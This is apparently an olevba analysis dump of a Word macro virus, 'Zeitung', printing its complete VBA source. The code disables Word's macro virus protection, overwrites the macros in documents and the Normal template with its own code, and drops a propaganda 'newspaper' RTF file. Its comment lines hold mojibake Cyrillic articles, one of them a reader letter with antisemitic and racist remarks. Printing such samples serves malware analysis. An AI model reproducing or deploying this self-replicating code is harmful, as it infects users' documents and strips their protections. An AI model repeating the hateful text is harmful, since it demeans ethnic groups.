olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.c-f604691d6852d0f5476564b6a8a546261655e923
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.c-f604691d6852d0f5476564b6a8a546261655e923 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Signature = "VirusZeitung" 'ñèãíàòóðà âèðóñà
'èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî
'2
'íîìåð 2 çà 2000 ãîä
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
 End If
 End If
End Function
Private Sub Document_Open()
 On Error Resume Next
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If Mid(ActiveDocument.Name, 1, 12) = "Àäñêèé îãîíü" Then
  Exit Sub
 End If
 reg = False
 p = 0.05
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then p = 2 ' 2  ôåâðàëÿ
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then p = 2 ' 21 ìàðòà
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then p = 2 ' 30 àïðåëÿ
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then p = 2 ' 21 èþíÿ
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then p = 2 ' 2  àâãóñòà
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then p = 2 ' 21 ñåíòÿáðÿ
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then p = 2 ' 31 îêòÿáðÿ
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then p = 2 ' 21 äåêàáðÿ
 If Rnd >= p Then
  Exit Sub
 End If
 Documents.Add Template:="Normal", NewTemplate:=False
 With ActiveDocument.PageSetup
      .LineNumbering.Active = False
      .Orientation = wdOrientPortrait
      .TopMargin = CentimetersToPoints(1.5)
      .BottomMargin = CentimetersToPoints(1.5)
      .LeftMargin = CentimetersToPoints(2.5)
      .RightMargin = CentimetersToPoints(2)
      .Gutter = CentimetersToPoints(0)
      .HeaderDistance = CentimetersToPoints(1.25)
      .FooterDistance = CentimetersToPoints(1.25)
      .PageWidth = CentimetersToPoints(21)
      .PageHeight = CentimetersToPoints(29.7)
      .FirstPageTray = wdPrinterDefaultBin
      .OtherPagesTray = wdPrinterDefaultBin
      .SectionStart = wdSectionNewPage
      .OddAndEvenPagesHeaderFooter = False
      .DifferentFirstPageHeaderFooter = False
      .VerticalAlignment = wdAlignVerticalTop
      .SuppressEndnotes = False
      .MirrorMargins = False
 End With
 Druck_0 "À Ä Ñ Ê È É   Î Ã Î Í Ü", 40, True, wdAlignParagraphCenter, 0, False
 Druck_0 "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "10 ìàÿ  2000  ã.   ¹ 2 (2)", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "Ñåãîäíÿ â íîìåðå:", 18, True, wdAlignParagraphLeft, 0, True
 Druck_0 "* Ìíåíèÿ ÷èòàòåëåé î ãàçåòå. (Ïîäáîðêà èíòåðâüþ)", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Ïðåäëîæåíèÿ ïî óëó÷øåíèþ ðàáîòû ãàçåòû:", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ìû ñîâåðøåíñòâóåì ñâîé âèðóñ.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Íàñèëüíî ìèë íå áóäåøü.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ñâîé âèðóñ - ñâîèìè ðóêàìè. ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ìû - âàì, âû - íàì (î ïðîáëåìàõ îáðàòíîé ñâÿçè). ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Íàøè ïëàíû.", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 vb = 1
 ve = 1
 reg = True
 vb = Artikel_B(nt, vb, 1)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 vb = Artikel_B(nt, ve, 2)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 0, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, False
 For art = 3 To 6
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
  For v = vb + 1 To ve
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
 Next art
 vb = Artikel_B(nt, ve, 7)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 For v = vb + 2 To ve
  Druck_0 nt.codemodule.lines(v, 1), 14, True, wdAlignParagraphRight, 1.5, True
 Next v
 Selection.TypeParagraph
 Selection.TypeParagraph
 For art = 8 To 11
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
  Selection.TypeParagraph
  For v = vb + 1 To ve - 1
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
  Selection.TypeParagraph
 Next art
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 12)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 0, False
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 4, 1), 14, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 5, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
 Selection.TypeParagraph
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 13)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, True, wdAlignParagraphRight, 0, True
 reg = False
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Àâòîð èäåè - À. Í. Ãåíîâà", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîððåêòîð - Â. Ô. Ôåäîðîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ.", 14, False, wdAlignParagraphCenter, 0, True
 ActiveDocument.SaveAs FileName:="Àäñêèé îãîíü ¹ 2", FileFormat:=wdFormatRTF, LockComments:=False, Password:="", AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:=False
 ActiveDocument.Close
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = False
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then   'çàðàæåíèå àêòèâíîãî äîêóìåíòà
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
   For v = 1 To cofl
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, cofl
  End If
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then   'çàðàæåíèå øàáëîíà Normal
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
   For v = 1 To cofl
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, cofl
  End If
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind, Abz)
 Selection.Font.Size = Siz 'ðàçìåð øðèôòà
 Selection.Font.Bold = Bld 'æèðíîñòü
 Selection.ParagraphFormat.Alignment = Alg 'âûðàâíèâàíèå
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind) 'îòñòóï
 If Abz Then Selection.TypeParagraph
 If reg Then
  Selection.TypeText Text:=Mid(T, 2, Len(T) - 1)
 Else
  Selection.TypeText Text:=T
 End If
End Sub
Private Function Artikel_B(O, start, num)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_B = -1
  Exit Function
 End If
 While (O.codemodule.lines(start, 1) <> "'Articl #" + Trim(num)) And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 Artikel_B = start + 1
End Function
Private Function Artikel_E(O, start)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_E = -1
  Exit Function
 End If
 While (Mid(O.codemodule.lines(start, 1), 1, 9) <> "'Articl #") And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 If start > O.codemodule.countoflines Then
  start = start - 1
 End If
 Artikel_E = start - 1
End Function
'Articl #1
'ÏÅÐÂÛÉ ÍÎÌÅÐ ÂÛØÅË Â ÑÂÅÒ. ÌÍÅÍÈß  ×ÈÒÀÒÅËÅÉ.
'Âûõîä â ñâåò ïåðâîãî íîìåðà íàøåé ãàçåòû ñòàë íåîæèäàííîñòüþ äëÿ ìíîãèõ ëþäåé, èìåþùèõ äåëî ñ êîìïüþòåðàìè. Ìû ïîìåùàåì çäåñü íåáîëüøóþ ïîäáîðêó èíòåðâüþ, âçÿòûõ ó íåñêîëüêèõ ÷åëîâåê, âïåðâûå ïîçíàêîìèâøèõñÿ ñ "Àäñêèì îãíåì". Íàäååìñÿ, îíè äîñòàòî÷íî ïîëíî ïðåäñòàâëÿþò ñïåêòð ìíåíèé î íîâîé ãàçåòå. Ñëåäóåò îòìåòèòü, ÷òî íå âñå ëþäè ñîãëàøàëèñü íà èíòåðâüþ: ìíîãèå èñïûòûâàþò ñèëüíîå îòâðàùåíèå ê ñàòàíèñòàì è ñàòàíèíñêèì ñåêòàì.
'Articl #2
'Ëèïàòîâà Í. Í., ïàòåíòîâåä èç "Àñòðàõàíüãàçïðîìà".
'ß äóìàþ, ÷òî Âàøà ãàçåòà åñòü ïîëåçíåéøåå è íóæíîå èçîáðåòåíèå. Íå ñåêðåò, ÷òî ñåé÷àñ ñâîáîäà ïå÷àòè ñóùåñòâóåò òîëüêî íà áóìàãå, êîððóïöèÿ ñòàëà òîòàëüíîé, à ïðåññà ñïëîøü è ðÿäîì ëèæåò çàäíèöó âëàñòè, è íå âûïîëíÿåò ñâîåãî íàçíà÷åíèÿ. Ãàçåòà, êîòîðàÿ ïî-íàñòîÿùåìó ñâîáîäíà îò êàêîãî-ëèáî êîíòðîëÿ ñâåðõó, ñîâåðøåííî íåîáõîäèìà. Ó íåå åñòü òîëüêî îäèí íåäîñòàòîê: ñîâåðøåííî íåïîíÿòíî, êàê îñóùåñòâëÿåòñÿ îáðàòíàÿ ñâÿçü ìåæäó ÷èòàòåëÿìè è ãàçåòîé. Åñëè ÿ, ê ïðèìåðó, çàõî÷ó íàïèñàòü ïèñüìî â íåå, ïî êàêîìó àäðåñó åãî îòïðàâèòü? Äóìàþ, íàä ýòèì âîïðîñîì íàäî ïîðàáîòàòü. Êðîìå âñåãî ïðî÷åãî, ìíå î÷åíü ïîíðàâèëñÿ âàø ìàòåðèàë ïî íàöèîíàëüíîìó âîïðîñó. Ãîñïîäèí Ñàïóãèí ïîäíÿë âåñüìà àêòóàëüíóþ òåìó, îñîáåííî äëÿ íàøåãî ïðåäïðèÿòèÿ. Òàì, ãäå ÿ ðàáîòàþ, äàâíî òðåáóåòñÿ âìåøàòåëüñòâî ïàðòèè "ÐÍÅ". Ó íàñ ðóññêèõ ïî÷òè íå îñòàëîñü, íà êàæäîì ñêîëüêî-íèáóäü îòâåòñòâåííîì ïîñòó êàêîé-íèáóäü èíîðîäåö; âïðî÷åì, íå áóäó ãîëîñëîâíîé: â íàøåé ëàáîðàòîðèè ðàáîòàþò 8 ÷åëîâåê, èç íèõ ðóññêèõ òîëüêî òðîå, ñ÷èòàÿ ìåíÿ.
'Îñòàëüíûå: åâðåéêà, óêðàèíêà, ñïóòàâøàÿñÿ ñ àðàáîì, òàòàðêà, îäíà, âîîáùå íåîïðåäåëåííîé ðàñîâîé ïðèíàäëåæíîñòè è êàâêàçåö, âûäàþùèé ñåáÿ çà ðóññêîãî. Èç ðóññêèõ ìíîãèå ïóòàþòñÿ ñî âñÿêèìè èíîðîäöàìè è ïëîäÿò îò íèõ íåïîëíîöåííûõ äåòåé-ïîëóêðîâîê, à ó÷åíûì ñåêðåòàðåì â íàøåì èíñòèòóòå ðàáîòàåò ñòàðûé êîë÷åíîãèé åâðåé, ïî êîòîðîìó äàâíî ïëà÷åò ãàçîâàÿ êàìåðà. Ïóñòü ãîñïîäèí Ñàïóãèí çíàåò, ÷òî â ìîåì ëèöå îí âñåãäà íàéäåò ÿðîãî ñòîðîííèêà ñâîåãî äåëà. Åñëè ýòî âîçìîæíî, ÿ õîòåëà áû çíàòü, êàê ìîæíî âñòóïèòü â ïàðòèþ "Ðóññêîå íàöèîíàëüíîå åäèíñòâî".
'Articl #3
'Ðåçíèê Ä. Ì., ïðåïîäàâàòåëü ÀÃÒÓ.
'ß õîòåë áû ñêàçàòü, ÷òî íå îäîáðÿþ Âàøó ãàçåòó, òàê êàê îíà ïî ñâîåé ñóòè ïðåñòóïíàÿ, è ìàòåðèàëû, ïóáëèêóåìûå â íåé, òî æå íîñÿò ïðåñòóïíûé õàðàêòåð. Ñ÷èòàþ íóæíûì íàïîìíèòü Âàì, ÷òî íèêòî íå îòìåíÿë ñòàòåé Óãîëîâíîãî êîäåêñà, ïðåäóñìàòðèâàþùèõ óãîëîâíóþ îòâåòñòâåííîñòü çà ñîçäàíèå è ðàñïðîñòðàíåíèå êîìïüþòåðíûõ âèðóñîâ. Îòíîñèòåëüíî îïóáëèêîâàííûõ ìàòåðèàëîâ ìîãó ñêàçàòü, ÷òî âàøè ëþäè ñèëüíî ðèñêóþò, ñîîáùàÿ ñâîè ôàìèëèè. ×òî êàñàåòñÿ âàøåãî Ñàïóãèíà, òî îí ïðîñòî ãíèäà è êîçåë, ðàâíî êàê è Áàðêàøîâ. Ñîâåðøåííî ñëó÷àéíî ÿ óçíàë, êòî òàêîé Ñàïóãèí, è êàêèå êîçëû èç íàøåé àäìèíèñòðàöèè åìó ïîìîãàþò. Äóìàþ, ÷òî åãî ïîëèòè÷åñêàÿ äåÿòåëüíîñòü íåñîâìåñòèìà ñ ó÷åáîé â ÀÃÒÓ.
'Articl #4
'Âîåâîäèí È. Ã. ïðåïîäàâàòåëü ÀÃÒÓ.
'Ìíå êàæåòñÿ, ÷òî âàø âèðóñ íóæäàåòñÿ â çíà÷èòåëüíîì óñîâåðøåíñòâîâàíèè, òàê êàê ïðè ïåðâîì çàðàæåíèè îí íàìåðòâî âåøàåò Word è ñòðàäàåò ìíîæåñòâîì äðóãèõ íåäîðàáîòîê. ß äóìàþ, ÷òî çàðàæàòü äîêóìåíòû â ìîìåíò èõ îòêðûòèÿ è ñîçäàíèÿ ñîâåðøåííî íåîáÿçàòåëüíî: âî-ïåðâûõ, ýòî ïðèâîäèò ê çàâèñàíèþ, à âî-âòîðûõ ëþáîé ñîçäàííûé èëè îòêðûòûé äîêóìåíò îáÿçàòåëüíî áóäåò çàêðûò; çàðàæåíèå ïðè çàêðûòèè ïðåêðàñíî çàðåêîìåíäîâàëî ñåáÿ ó âñåõ ñîçäàòåëåé ìàêðîâèðóñîâ. Êðîìå òîãî, âíåäðåíèå òåêñòà ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò ïî-ìîåìó íå ñîâñåì áåçâðåäíî è íàñòðàèâàåò âàøèõ ïîòåíöèàëüíûõ ÷èòàòåëåé ïðîòèâ âàñ. Áûëî áû íàìíîãî óäîáíåå ñîçäàâàòü ñïåöèàëüíûé ôàéë è çàïèñûâàòü òåêñò ãàçåòû â íåãî. Ðàíî èëè ïîçäíî ÷èòàòåëü îáíàðóæèò íîâûå ôàéëû íà äèñêå è çàõî÷åò  ñ íèìè îçíàêîìèòüñÿ. Òîãäà ýòî íèêîìó íå ïðè÷èíèò âðåäà.
'Articl #5
'Øóãàåâ Â. Ò. èíæåíåð.
'ß äóìàþ, ÷òî òàêàÿ ãàçåòà ñîâåðøåííî íåîáõîäèìà â íàøåì ãîðîäå, ãäå îò îáû÷íîé ïðåññû íåò íèêàêîãî òîëêà, òîëüêî îíà äîëæíà íàõîäèòüñÿ â ðóêàõ íå ñàòàíèñòîâ, à êàêîé-ëèáî íåéòðàëüíîé ãðóïïû ëþäåé. Ïîíèìàåòå, ðåáÿòà, âàøà ðåëèãèîçíàÿ ïðèíàäëåæíîñòü îòòàëêèâàåò ëþäåé îò âàñ. Ó íàñ ñëîâà "ñàòàíèçì" è "ñàòàíèñòû" âûçûâàþò èíñòèíêòèâíîå îòâðàùåíèå, à â ðåçóëüòàòå âàøè ïîòåíöèàëüíûå ÷èòàòåëè ïðîõîäÿò ìèìî âàæíîãî íà÷èíàíèÿ.
'Ñàì ÿ äàâíî óâëåêàþñü ïðîãðàììèðîâàíèåì, è ìíå êàæåòñÿ, ÷òî âû ñäåëàëè íàñòîÿùåå îòêðûòèå â îáëàñòè êîìïüþòåðíîé âèðóñîëîãèè: "âèðóñíîé ãàçåòû" (èëè "ãàçåòíîãî âèðóñà", êîìó êàê áîëüøå íðàâèòñÿ) åùå íèêòî, ïî ìîèì ñâåäåíèÿì, íå äåëàë. Ýòî î÷åíü õîðîøî, ÷òî âàøà ãàçåòà îòêðûòà äëÿ âñåõ, îäíàêî íåïîíÿòíî, êàêèì îáðàçîì ìîæíî íàïèñàòü ïèñüìî â ðåäàêöèþ íåå, âåäü íàñêîëüêî ÿ ïîíÿë, âû íå ïðèâåëè ñâîè êîîðäèíàòû? Ìåíÿ òàêæå èíòåðåñóåò, ìîæåòå ëè Âû ïîìåùàòü ðàçíûå îáúÿâëåíèÿ è ðåêëàìó?
'Articl #6
'Ñèìîíîâ È. Â. âðà÷-ïñèõèàòð.
'Ñðàçó ñêàæó, ÷òî â âàøåì äåëå ÿ ðàçáèðàþñü ñëàáî, íî ìíå êàæåòñÿ, ÷òî ãëàâàðþ âàøåé ñåêòû è äèðåêòîðó ãàçåòû òðåáóåòñÿ ñåðüåçíîå ëå÷åíèå. Ïî-ìîåìó îíè ñòðàäàþò ìàíèåé âåëè÷èÿ, êîòîðàÿ óæå äîâåëà èõ äî ïðîòèâîïðàâíûõ äåéñòâèé, è â äàëüíåéøåì ìîæåò ïðèâåñòè â òþðüìó. Òî æå ñàìîå ìîãó ñêàçàòü îáî âñåì àâòîðñêîì êîëëåêòèâå. Î÷åíü íàñòîðàæèâàåò òî îáñòîÿòåëüñòâî, ÷òî ýòè ëþäè îòêðûòî ïðèâîäÿò ñâîè ôàìèëèè, êîãäà ñëåäîâàëî áû îæèäàòü îò íèõ ìàêñèìàëüíîé ñêðûòíîñòè. Êàê âðà÷ ÿ íàñòîÿòåëüíî ðåêîìåíäóþ èì ïðîéòè îáñëåäîâàíèå íà ïðåäìåò ñîñòîÿíèÿ èõ ïñèõèêè, ïîêà åùå íå ïîçäíî.
'Articl #7
'Õàðèòîíîâ À. À., ñòóäåíò.
'Áåçóñëîâíî, íèêåì íå êîíòðîëèðóåìàÿ ãàçåòà íåîáõîäèìà, à òî, êàê âû åå ðàñïðîñòðàíÿåòå íå èìååò íèêàêîãî çíà÷åíèÿ. Òîëüêî âèðóñ íóæíî íåìíîãî äîðàáîòàòü, ÷òîáû îí íå èñêàæàë ðåäàêòèðóåìûé òåêñò. Õîòåëîñü áû çíàòü, êàê ó âàñ îñóùåñòâëÿåòñÿ ñâÿçü ñ îáùåñòâåííîñòüþ è ìîæåòå ëè âû îêàçàòü êîíêðåòíóþ ïîìîùü â êàêîì-ëèáî äåëå? Íåëüçÿ ëè ó âàñ ïîìåùàòü îáúÿâëåíèÿ î çíàêîìñòâàõ? Åñëè äà, òî ÿ îáåèìè ðóêàìè ãîëîñóþ çà ïðîäîëæåíèå âàøåãî äåëà è äàëüíåéøóþ ðàáîòó ãàçåòû.
'Êîððåñïîíäåíòû:  À. Ï. Ïåòóõîâ,
'Ê. Å. Âàñèëüêîâ,
'Ì. Â. ×óðèëîâ,
'Ñ. Ì. Ïåòðåíêî,
'À.Ã.Ðûáêèí
'Articl #8
'ÃÀÇÅÒÀ ÑÎÇÄÀÍÀ. ÊÓÄÀ ÒÅÏÅÐÜ ?
'Íà ìàðòîâñêîì øàáàøå 2000 ãîäà áûëî ñîçâàíî îòäåëüíîå çàñåäàíèå ñ ó÷àñòèåì ðóêîâîäèòåëåé ñåêòû è ðóêîâîäÿùåãî ñîñòàâà ãàçåòû; åãî òåìîé ñòàëè ïåðñïåêòèâû äàëüíåéøåãî ðàçâèòèÿ ãàçåòû "Àäñêèé îãîíü".
'Â íà÷àëå çàñåäàíèÿ ãëàâàðü ñåêòû âûñòóïèë ñ ñîîáùåíèåì î íåîáõîäèìîñòè èñïðàâëåíèÿ íåäîñòàòêîâ â ðàáîòå ãàçåòû, êîòîðûå ñäåðæèâàëè åå äàëüíåéøåå ðàñïðîñòðàíåíèå. Â õîäå ïîñëåäîâàâøåé çà ýòèì äèñêóññèè áûëè âûñêàçàíû ìíîãî÷èñëåííûå ïðåäëîæåíèÿ, ïîäâåðãàâøèåñÿ îáñóæäåíèþ âñåìè ó÷àñòíèêàìè çàñåäàíèÿ. Îòäåëüíûå ïðåäëîæåíèÿ áûëè ïðèíÿòû ê èñïîëíåíèþ. Çà îãðàíè÷åííîñòüþ ìåñòà ìû ïðèâîäèì íåêîòîðûå èç íèõ.
'Ëåòîïèñåö ñåêòû  À. Â. Àáäèêååâ
'Articl #9
'ÌÛ ÑÎÂÅÐØÅÍÑÒÂÓÅÌ ÑÂÎÉ ÂÈÐÓÑ
'Íà íàñòîÿùèé ìîìåíò íàìè ïðîäåëàíà îãðîìíàÿ ðàáîòà ïî ðàñïðîñòðàíåíèþ ãàçåòû "Àäñêèé îãîíü" è íàêîïëåí íåìàëûé îïûò èñïîëüçîâàíèÿ êîìïüþòåðíûõ âèðóñîâ â êîíñòðóêòèâíûõ öåëÿõ. Âìåñòå ñ òåì, îòìå÷åíû îòäåëüíûå íåäîñòàòêè, êîòîðûå áóäóò ïðåîäîëåíû  õîäå äàëüíåéøåé ðàáîòû.
'Â ÷àñòíîñòè, ïî îòçûâàì íàøèõ ñåêòàíòîâ, âçÿâøèõñÿ ðàñïðîñòðàíÿòü âèðóñ, ïðè çàðàæåíèè èì ãëàâíîãî øàáëîíà NORMAL.DOT â ïåðâûé ðàç Word "çàâèñàåò"; êðîìå òîãî, âèðóñ âñòàâëÿåò òåêñò ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò, ÷òî íå âñåãäà èäåò íà ïîëüçó åãî ðàçáîð÷èâîñòè íà ýêðàíå, à òàêæå ðàçäðàæàåò ïîëüçîâàòåëÿ. Ïî ñëîâàì íàøåãî êîíñóëüòàíòà-âèðóñîëîãà Ï. Â. Íîãèíà âèðóñ ïåðåãðóæåí ëèøíèìè äåòàëÿìè, êîòîðûå òîëüêî òîðìîçÿò åãî ðàáîòó.
'Ñ ó÷åòîì âûøåñêàçàííîãî áûëè ïðîâåäåíû ïåðåãîâîðû ñ àâòîðàìè âèðóñà, êîòîðûå íàïèñàëè åãî íîâóþ âåðñèþ, íå èìåþùóþ äàííûõ íåäîñòàòêîâ. Íàìè áûëè ïðîâåäåíû âñåñòîðîííèå èñïûòàíèÿ íîâîãî âèðóñà íà êîìïüþòåðàõ ñåêòû, êîòîðûå ïîêàçàëè åãî ñïîñîáíîñòü êîððåêòíî çàðàæàòü ëþáûå äîêóìåíòû Word.
'Òåïåðü òåêñò ãàçåòû çàíîñèòñÿ â îòäåëüíûé ôàéë ôîðìàòà .RTF, êîòîðûé ïîëó÷àåò èìÿ "Àäñêèé îãîíü ¹ ..." è çàïèñûâàåòñÿ íà äèñê. Èíîãäà ýòî ïðîõîäèò íåçàìåòíî äëÿ ïîëüçîâàòåëÿ.
'Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ
'Articl #10
